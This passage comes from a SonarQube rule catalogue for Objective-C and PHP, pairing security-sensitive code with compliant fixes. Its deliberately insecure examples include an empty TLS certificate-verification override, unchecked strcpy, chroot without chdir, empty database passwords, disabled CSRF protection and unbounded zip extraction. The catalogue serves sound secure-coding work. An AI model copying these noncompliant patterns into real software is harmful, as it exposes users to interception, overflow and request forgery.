<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
dbi_conn conn &#61; dbi_conn_new(&#34;mysql&#34;);
string host &#61; &#34;10.10.0.1&#34;; // Sensitive
dbi_conn_set_option(conn, &#34;host&#34;, host.c_str());
dbi_conn_set_option(conn, &#34;host&#34;, &#34;10.10.0.1&#34;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
dbi_conn conn &#61; dbi_conn_new(&#34;mysql&#34;);
string host &#61; getDatabaseHost(); // Compliant
dbi_conn_set_option(conn, &#34;host&#34;, host.c_str()); // Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ" rel="nofollow">CERT, MSC03-J.</a> - Never hard code sensitive information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S4830">
              objc:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to
use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks
{
    virtual void tls_verify_cert_chain(
              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,
              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,
              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,
              Botan::Usage_Type usage,
              const std::string &amp;hostname,
              const Botan::TLS::Policy &amp;policy)
    override  { }
};

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information(&#34;example.com&#34;, 443),
                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks { };

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information(&#34;example.com&#34;, 443),
                              Botan::TLS::Protocol_Version::TLS_V12);
}
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://botan.randombit.net/handbook/" rel="nofollow">Botan</a> - Handbook </li><li> <a href="https://www.feistyduck.com/books/openssl-cookbook/" rel="nofollow">OpenSSL</a> - Cookbook </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/295" rel="nofollow">MITRE, CWE-295</a> - Improper Certificate Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5801">
              objc:S5801
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strcpy(char * restrict dest, const char * restrict src);</code> copies characters from <code>src</code> to
<code>dest</code>. The <code>wcscpy</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Note: the functions <code>strncpy</code> and <code>wcsncpy</code> might look like attractive safe replacements for <code>strcpy</code> and
<code>wcscpy</code>, but they have their own set of issues (see <a href="/organizations/sopra-steria/rules?open&#61;objc%3AS5816&amp;rule_key&#61;objc%3AS5816" rel="nofollow">S5816</a>), and you should probably prefer another more adapted
alternative.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that either the source or the destination pointer is <code>null</code> </li><li> There is a possibility that the source string is not correctly <code>null</code>-terminated, or that its length (including the final
  <code>null</code> character) can be larger than the size of the destination buffer. </li><li> There is an overlap between source and destination </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> C11 provides, in its annex K, the <code>strcpy_s</code> and the <code>wcscpy_s</code> that were designed as safer alternatives to
  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions, for example, <code>strlcpy</code> in
  FreeBSD </li><li> If you are writing C&#43;&#43; code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, src); // Sensitive: might overflow
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char *dest &#61; malloc(strlen(src) &#43; 1); // For the final 0
  strcpy(dest, src); // Compliant: we made sure the buffer is large enough
  int r&#61; doSomethingWith(dest);
  free(dest);
  return r;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5802">
              objc:S5802
            </a>
          </td>
          <td>
            <details>
              <p>The purpose of creating a jail, the &#34;virtual root directory&#34; created with chroot-type functions, is to limit access to the file system by isolating
the process inside this jail. However, many chroot function implementations don’t modify the current working directory, thus the process has still
access to unauthorized resources outside of the &#34;jail&#34;.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application changes the working directory before or after running chroot. </li><li> The application uses a path inside the jail directory as working directory. </li></ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Change the current working directory to the root directory after switching to a jail directory.</p>
<h2>Sensitive Code Example</h2>
<p>The current directory is not changed with the <code>chdir</code> function before or after the creation of a jail with the <code>chroot</code>
function:</p>
<pre>
const char* root_dir &#61; &#34;/jail/&#34;;
chroot(root_dir); // Sensitive: no chdir before or after chroot, and missing check of return value
</pre>
<p>The <code>chroot</code> or <code>chdir</code> operations could fail and the process still have access to unauthorized resources. The return code
should be checked:</p>
<pre>
const char* root_dir &#61; &#34;/jail/&#34;;
chroot(root_dir); // Sensitive: missing check of the return value
const char* any_dir &#61; &#34;/any/&#34;;
chdir(any_dir); // Sensitive: missing check of the return value
</pre>
<h2>Compliant Solution</h2>
<p>To correctly isolate the application into a jail, change the current directory with <code>chdir</code> before the <code>chroot</code> and check the
return code of both functions:</p>
<pre>
const char* root_dir &#61; &#34;/jail/&#34;;

if (chdir(root_dir) &#61;&#61; -1) {
  exit(-1);
}

if (chroot(root_dir) &#61;&#61; -1) {  // compliant: the current dir is changed to the jail and the results of both functions are checked
  exit(-1);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> -
  Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/243" rel="nofollow">MITRE, CWE-243</a> - Creation of chroot Jail Without Changing Working Directory </li><li> <a href="https://man7.org/linux/man-pages/man2/chdir.2.html" rel="nofollow">man7.org</a> - chdir </li><li> <a href="https://man7.org/linux/man-pages/man2/chroot.2.html" rel="nofollow">man7.org</a> - chroot </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2115">
              php:S2115
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>When relying on the password authentication mode for the database connection, a secure password should be chosen.</p>
<p>This rule raises an issue when an empty password is used.</p>
<h3>Noncompliant code example</h3>
<pre>
// example of an empty password when connecting to a mysql database
$conn &#61; new mysqli($servername, $username, &#34;&#34;);
</pre>
<h3>Compliant solution</h3>
<pre>
// generate a secure password, set it to the username database, and store it in a environment variable for instance
$password &#61; getenv(&#39;MYSQL_SECURE_PASSWORD&#39;);
// then connect to the database
$conn &#61; new mysqli($servername, $username, $password);
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication.html" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken
  Authentication </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/521" rel="nofollow">MITRE, CWE-521</a> - Weak Password Requirements </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4502">
              php:S4502
            </a>
          </td>
          <td>
            <details>
              <p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The web application uses cookies to authenticate users. </li><li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li><li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Protection against CSRF attacks is strongly recommended:
    <ul><li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods" rel="nofollow">unsafe HTTP
      methods</a>. </li><li> implemented, for example, with an unguessable CSRF token </li></ul>  </li><li> Of course all sensitive operations should not be performed with <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods" rel="nofollow">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li></ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://laravel.com/docs/8.x/csrf#csrf-excluding-uris" rel="nofollow">Laravel VerifyCsrfToken middleware</a></p>
<pre>
use Illuminate\Foundation\Http\Middleware\VerifyCsrfToken as Middleware;

class VerifyCsrfToken extends Middleware
{
    protected $except &#61; [
        &#39;api/*&#39;
    ]; // Sensitive; disable CSRF protection for a list of routes
}
</pre>
<p>For <a href="https://symfony.com/doc/current/security/csrf.html#csrf-protection-in-symfony-forms" rel="nofollow">Symfony Forms</a></p>
<pre>
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

class Controller extends AbstractController {

  public function action() {
    $this-&gt;createForm(&#39;&#39;, null, [
      &#39;csrf_protection&#39; &#61;&gt; false, // Sensitive; disable CSRF protection for a single form
    ]);
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://laravel.com/docs/8.x/csrf#csrf-excluding-uris" rel="nofollow">Laravel VerifyCsrfToken middleware</a></p>
<pre>
use Illuminate\Foundation\Http\Middleware\VerifyCsrfToken as Middleware;

class VerifyCsrfToken extends Middleware
{
    protected $except &#61; []; // Compliant
}
</pre>
<p>Remember to add <a href="https://laravel.com/docs/8.x/blade#csrf-field" rel="nofollow">&#64;csrf</a> blade directive to the relevant forms when removing an element
from $except. Otherwise the form submission will stop working.</p>
<p>For <a href="https://symfony.com/doc/current/security/csrf.html#csrf-protection-in-symfony-forms" rel="nofollow">Symfony Forms</a></p>
<pre>
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

class Controller extends AbstractController {

  public function action() {
    $this-&gt;createForm(&#39;&#39;, null, []); // Compliant; CSRF protection is enabled by default
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/352" rel="nofollow">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-community/attacks/csrf" rel="nofollow">OWASP: Cross-Site Request Forgery</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4508">
              php:S4508
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Deserializing objects is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-17672" rel="nofollow">CVE-2017-17672</a>: vBulletin: Unserialize PHP Code Execution </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-1000167" rel="nofollow">CVE-2018-1000167</a>: Jenkins Pipeline: arbitrary code execution
  vulnerability </li></ul>
<p>Object deserialization from an untrusted source can lead to unexpected code execution. Deserialization takes a stream of bits and turns it into an
object. If the stream contains the type of object you expect, all is well. But if you’re deserializing data coming from untrusted input, and an
attacker has inserted some other type of object, you’re in trouble. Why? <a href="https://www.owasp.org/index.php/PHP_Object_Injection" rel="nofollow">A known attack
scenario</a> involves the creation of a serialized PHP object with crafted attributes which will modify your application’s behavior. This attack
relies on <a href="https://php.net/manual/en/language.oop5.magic.php" rel="nofollow">PHP magic methods</a> like <code>__desctruct</code>, <code>__wakeup</code> or
<code>__string</code>. The attacker doesn’t necessarily need the source code of the targeted application to exploit the vulnerability, he can also
rely on the presence of open-source component and use <a href="https://github.com/ambionics/phpggc" rel="nofollow">tools to craft malicious payloads</a>.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> an attacker could have tampered with the source provided to the deserialization function </li><li> you are using an unsafe deserialization function </li></ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To prevent insecure deserialization, it is recommended to:</p>
<ul><li> Use safe libraries that do not allow code execution at deserialization. </li><li> Not communicate with the outside world using serialized objects </li><li> Limit access to the serialized source
    <ul><li> if it is a file, restrict the access to it. </li><li> if it comes from the network, restrict who has access to the process, such as with a Firewall or by authenticating the sender first. </li></ul>  </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data" rel="nofollow">OWASP - Deserialization of untrusted data</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" rel="nofollow">OWASP Top 10 2017 Category A8</a> - Insecure
  Deserialization </li><li> <a href="https://cwe.mitre.org/data/definitions/502" rel="nofollow">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#OBJECT_DESERIALIZATION" rel="nofollow">OBJECT_DESERIALIZATION </a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4507">
              php:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li><li> The application runs by default with debug features activated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<p>CakePHP 1.x, 2.x:</p>
<pre>
Configure::write(&#39;debug&#39;, 1); // Sensitive: development mode
or
Configure::write(&#39;debug&#39;, 2); // Sensitive: development mode
or
Configure::write(&#39;debug&#39;, 3); // Sensitive: development mode
</pre>
<p>CakePHP 3.0:</p>
<pre>
use Cake\Core\Configure;

Configure::config(&#39;debug&#39;, true); // Sensitive: development mode
</pre>
<p>WordPress:</p>
<pre>
define( &#39;WP_DEBUG&#39;, true ); // Sensitive: development mode
</pre>
<h2>Compliant Solution</h2>
<p>CakePHP 1.2:</p>
<pre>
Configure::write(&#39;debug&#39;, 0); // Compliant; this is the production mode
</pre>
<p>CakePHP 3.0:</p>
<pre>
use Cake\Core\Configure;

Configure::config(&#39;debug&#39;, false); // Compliant:  &#34;0&#34; or &#34;false&#34; for CakePHP 3.x is suitable (production mode) to not leak sensitive data on the logs.
</pre>
<p>WordPress:</p>
<pre>
define( &#39;WP_DEBUG&#39;, false ); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li><li> <a href="https://cwe.mitre.org/data/definitions/215" rel="nofollow">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5042">
              php:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio" rel="nofollow">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul><li> There is no validation of the number of entries in the archive. </li><li> There is no validation of the total size of the uncompressed data. </li><li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li><li> Define and control the threshold for maximum total size of the uncompressed data. </li><li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li></ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://www.php.net/manual/en/class.ziparchive.php" rel="nofollow">ZipArchive</a> module:</p>
<pre>
$zip &#61; new ZipArchive();
if ($zip-&gt;open($file) &#61;&#61;&#61; true) {
    $zip-&gt;extractTo(&#39;.&#39;); // Sensitive
    $zip-&gt;close();
}
</pre>
<p>For <a href="https://www.php.net/manual/en/ref.zip.php" rel="nofollow">Zip</a> module:</p>
<pre>
$zip &#61; zip_open($file);
while ($file &#61; zip_read($zip)) {
    $filename &#61; zip_entry_name($file);
    $size &#61; zip_entry_filesize($file);

    if (substr($filename, -1) !&#61;&#61; &#39;/&#39;) {
        $content &#61; zip_entry_read($file, zip_entry_filesize($file)); // Sensitive - zip_entry_read() uses zip_entry_filesize()
        file_put_contents($filename, $content);
    } else {
        mkdir($filename);
    }
}
zip_close($zip);
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://www.php.net/manual/en/class.ziparchive.php" rel="nofollow">ZipArchive</a> module:</p>
<pre>
define(&#39;MAX_FILES&#39;, 10000);
define(&#39;MAX_SIZE&#39;, 1000000000); // 1 GB
define(&#39;MAX_RATIO&#39;, 10);
define(&#39;READ_LENGTH&#39;, 1024);

$fileCount &#61; 0;
$totalSize &#61; 0;

$zip &#61; new ZipArchive();
if ($zip-&gt;open($file) &#61;&#61;&#61; true) {
    for ($i &#61; 0; $i &lt; $zip-&gt;numFiles; $i&#43;&#43;) {
        $filename &#61; $zip-&gt;getNameIndex($i);
        $stats &#61; $zip-&gt;statIndex($i);

        if (strpos($filename, &#39;../&#39;) !&#61;&#61; false || substr($filename, 0, 1) &#61;&#61;&#61; &#39;/&#39;) {
            throw new Exception();
        }

        if (substr($filename, -1) !&#61;&#61; &#39;/&#39;) {
            $fileCount&#43;&#43;;
            if ($fileCount &gt; MAX_FILES) {
                // Reached max. number of files
                throw new Exception();
            }

            $fp &#61; $zip-&gt;getStream($filename); // Compliant
            $currentSize &#61; 0;
            while (!feof($fp)) {
                $currentSize &#43;&#61; READ_LENGTH;
                $totalSize &#43;&#61; READ_LENGTH;

                if ($totalSize &gt; MAX_SIZE) {
                    // Reached max. size
                    throw new Exception();
                }

                // Additional protection: check compression ratio
                if ($stats[&#39;comp_size&#39;] &gt; 0) {
                    $ratio &#61; $currentSize / $stats[&#39;comp_size&#39;];
                    if ($ratio &gt; MAX_RATIO) {
                        // Reached max. compression ratio
                        throw new Exception();
                    }
                }

                file_put_contents($filename, fread($fp, READ_LENGTH), FILE_APPEND);
            }

            fclose($fp);
        } else {
            mkdir($filename);
        }
    }
    $zip-&gt;close();
}
</pre>
<p>For <a href="https://www.php.net/manual/en/ref.zip.php" rel="nofollow">Zip</a> module:</p>
<pre>
define(&#39;MAX_FILES&#39;, 10000);
define(&#39;MAX_SIZE&#39;, 1000000000); // 1 GB
define(&#39;MAX_RATIO&#39;, 10);
define(&#39;READ_LENGTH&#39;, 1024);

$fileCount &#61; 0;
$totalSize &#61; 0;

$zip &#61; zip_open($file);
while ($file &#61; zip_read($zip)) {
    $filename &#61; zip_entry_name($file);

    if (strpos($filename, &#39;../&#39;) !&#61;&#61; false || substr($filename, 0, 1) &#61;&#61;&#61; &#39;/&#39;) {
        throw new Exception();
    }

    if (substr($filename, -1) !&#61;&#61; &#39;/&#39;) {
        $fileCount&#43;&#43;;
        if ($fileCount &gt; MAX_FILES) {
            // Reached max. number of files
            throw new Exception();
        }

        $currentSize &#61; 0;
        while ($data &#61; zip_entry_read($file, READ_LENGTH)) { // Compliant
            $currentSize &#43;&#61; READ_LENGTH;
            $totalSize &#43;&#61; READ_LENGTH;

            if ($totalSize &gt; MAX_SIZE) {
                // Reached max. size
                throw new Exception();
            }

            // Additional protection: check compression ratio
            if (zip_entry_compressedsize($file) &gt; 0) {
                $ratio &#61; $currentSize / zip_entry_compressedsize($file);
                if ($ratio &gt; MAX_RATIO) {
                    // Reached max. compression ratio
                    throw new Exception();
                }
            }

